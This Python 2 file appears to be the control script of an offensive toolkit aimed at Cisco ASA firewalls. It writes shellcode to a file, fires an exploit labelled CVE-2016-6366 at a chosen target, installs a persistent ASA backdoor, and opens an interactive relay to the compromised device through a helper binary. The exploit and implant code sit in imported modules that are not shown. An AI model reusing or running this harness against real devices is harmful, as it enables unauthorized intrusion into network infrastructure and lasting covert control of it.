# -*- coding:utf-8 -*-
#!/usr/bin/python

from shellcode import *
from conf import *
from cui import *
from exploit import *
from implant import *
import os
import termios
import tty
import time

def global_config(isInit=False):
    global gl_Conf

    gl_Conf.input_target_addr_info(isInit)

def output_shellcode_to_file():
    global gl_Conf

    if gl_Conf.choose_target_ver() is not True:
        return False
    gl_Conf.input_shellcode_output_path()

    print ""
    print "[+] Set Target Version         -> Ver " + gl_Conf.targetVer
    print "[+] Set Shellcode Output Path  -> " + gl_Conf.sCodeOutPath

    if ShellcodeCollect.output_shellcode_to_file(gl_Conf.targetVer, gl_Conf.sCodeOutPath) is True:
        print "[+] Shellcode output to '%s' completed." % gl_Conf.sCodeOutPath

    gl_Conf.sCodeFilePath = gl_Conf.sCodeOutPath

    return True

def exec_exploit(expName):
    global gl_Conf
    retVal = None

    if gl_Conf.choose_target_ver() == False:
        return False

    gl_Conf.input_shellcoe_file_path()
    if gl_Conf.verify_exploit_param() is not True:
        return False

    if expName == "CVE-2016-6366":
        exp = CVE_2016_6366(gl_Conf.iface, gl_Conf.targetIP, gl_Conf.targetPort, gl_Conf.targetVer, gl_Conf.sCodeFilePath)
        retVal = exp.execute()

    if retVal is True:
        print "[+] Execute Exploit Success."
        return True
    return False

def implant_backdoor():
    global gl_Conf

    if gl_Conf.choose_target_ver() is not True:
        return False
    if gl_Conf.verify_implant_param() is not True:
        return False

    if implant_asa_backdoor_ver_1(gl_Conf.iface, gl_Conf.targetIP, gl_Conf.targetVer) is not True:
        print "[-] Implant Backdoor Failed."
        return False
    print "[+] Backdoor Installed!"

    return True

def lauch_lp():
    global gl_Conf
    rdPipe       = [0, 0]
    wrPipe       = [0, 0]

    try:
        rdPipe[0], rdPipe[1] = os.pipe()
        wrPipe[0], wrPipe[1] = os.pipe()
    except Exception, e:
        print "[-] Can't create pipe. Exception: " + str(e)
        return False

    subprocPid = os.fork()

    if subprocPid == 0:
        #subproc
        os.close(rdPipe[0])
        os.close(wrPipe[1])
        os.dup2(rdPipe[1], sys.stdout.fileno())
        os.dup2(wrPipe[0], sys.stdin.fileno())
        os.execl(os.getcwd() + "/ac", os.getcwd() + "/ac",
                 gl_Conf.targetIP, str(gl_Conf.targetPort))
    elif subprocPid < 0:
        os.close(rdPipe[0])
        os.close(rdPipe[1])
        os.close(wrPipe[0])
        os.close(wrPipe[1])
    else:
        os.close(rdPipe[1])
        os.close(wrPipe[0])

        exitFlag = False
        writeBuff = ""
        while True:
            rdSet = [rdPipe[0]]
            wrSet = [wrPipe[1]]
            readBuffer = None

            rdList, wrList, _ = select.select(rdSet, wrSet, [], 0.1)
            for rd in rdList:
                try:
                    readBuffer = os.read(rd, 65536)
                    if len(readBuffer) <= 0:
                        exitFlag = True
                    else:
                        sys.stdout.write(readBuffer)
                        sys.stdout.flush()
                except Exception, e:
                    exitFlag = True

            for wr in wrList:
                try:
                    old_settings = termios.tcgetattr(sys.stdin)
                    tty.setcbreak(sys.stdin.fileno())
                    if select.select([sys.stdin], [], [], 0.1) == ([sys.stdin], [], []):
                        c = sys.stdin.read(1)
                        writeBuff += c
                        sys.stdout.write(c)
                        sys.stdout.flush()
                        if c == '\n':
                            os.write(wr, writeBuff)
                            writeBuff = ""
                    termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)
                except Exception, e:
                    exitFlag = True

            if exitFlag is True:
                break

        os.close(rdPipe[0])
        os.close(wrPipe[1])
        os.kill(subprocPid, 9)
        os.waitpid(subprocPid, 0)














